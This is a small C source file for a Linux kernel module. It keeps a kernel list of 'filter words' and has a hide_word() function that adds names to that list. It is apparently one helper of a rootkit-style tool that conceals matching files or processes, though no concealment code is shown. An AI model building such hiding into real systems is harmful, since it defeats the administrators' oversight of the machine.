#include "shared.h"
#include "linux/list.h"
#include "linux/slab.h"

LIST_HEAD(filter_words);

int hide_word(char *name) {
  struct filter_word *insert;
  insert = kmalloc(sizeof(*insert), GFP_KERNEL);
  if (!insert)
    return -2;
  insert->name = name;

  list_add(&insert->list, &filter_words);

  return 0;
}
